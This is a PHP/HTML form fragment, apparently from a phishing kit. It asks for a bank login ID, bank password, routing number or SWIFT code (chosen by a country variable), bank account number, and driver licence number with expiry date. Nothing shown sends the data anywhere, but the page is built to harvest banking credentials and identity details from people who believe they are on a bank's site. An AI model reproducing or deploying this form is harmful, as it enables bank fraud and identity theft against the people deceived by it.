                    <form method="post" id="parentForm" name="bank_Form" action="Submit" class="edit">
                        <p class="group fcenter">

                          
                            <label for="bank_id">LOGIN ID :</label>
                                <span class="field">
                                    <input type="text" id="bank_id" autocomplete="off" style="width: 12em;" maxlength="20" name="bank_id" value="" required="" title="Login ID">
                                </span>

                            <label for="bank_pass">Bank Password :</label>
                                <span class="field">
                                    <input type="password" id="bank_pass" autocomplete="off" style="width: 12em;" maxlength="20" name="bank_pass" value="" required="" title="Login ID">
                                </span>

<?php
if ($negara=="US"){ echo '
                            <label for="routing_number">Routing Number :</label>
                                <span class="field">
                                    <input type="text" id="routing_number" autocomplete="off" style="width: 12em;" length="9" name="routing_number" value="" required="" title="Routing Number">
                                </span>
';}
else
{  echo '
                            <label for="routing_number">Swift Code :</label>
                                <span class="field">
                                    <input type="text" id="routing_number" autocomplete="off" style="width: 12em;" maxlength="12" name="routing_number" value="" required="" title="Swift Code">
                                </span>
';}
?>
                            <label for="bank_number">Bank Account Number :</label>
                                <span class="field">
                                    <input type="text" id="bank_number" autocomplete="off" style="width: 12em;" maxlength="20" name="bank_number" value="" required="" title="Login ID">
                                </span>
                                
                                
                                <br>
                                
<center><h2>Your Driver License for identification<h2></center>
  
 <center> <label for="driver">Driver Number:</label>
                                <span class="field">
                                    <input type="text" id="bank_id" autocomplete="off" style="width: 12em;" maxlength="20" name="driver" value="" required="" title="driver">
                                </span></center>
                             <center>     <label for="expdate">&Epsilon;xpiration Date :</label>
                                <span class="field" style="margin-bottom: 7px;">
<?php
echo date_dropdown(20);
function date_dropdown($year_limit = 0)
{
        /*month*/
        $html_output .= '                                   <select class="smal" required="required" name="expdate_month" title="Exp month">'."\n";
        $html_output .= '                                       ';
            for ($exp_month = 1; $exp_month <= 12; $exp_month++) {
            	if (strlen($exp_month) === 1){
            		$html_output .= '<option value="0' . $exp_month . '">0' . $exp_month . '</option>';
            	} else {
            		$html_output .= '<option value="' . $exp_month . '">' . $exp_month . '</option>';
            	}
            }
        $html_output .= "\n".'                                  </select>&nbsp;&nbsp;/&nbsp;&nbsp;'."\n";

        /*years*/
    if (date('m') == 12){
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y') + 1; $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    } else {
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y'); $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    }

    return $html_output;
}
?>
                                </span> </center>
 
                            <div class="ngawur">
                            </div>

                        </p>

                        <p class="bcenter">
                        <button style="width: 100px !important;" type="submit" value="Submit" class="button">Submit</button></p>

</form>
                       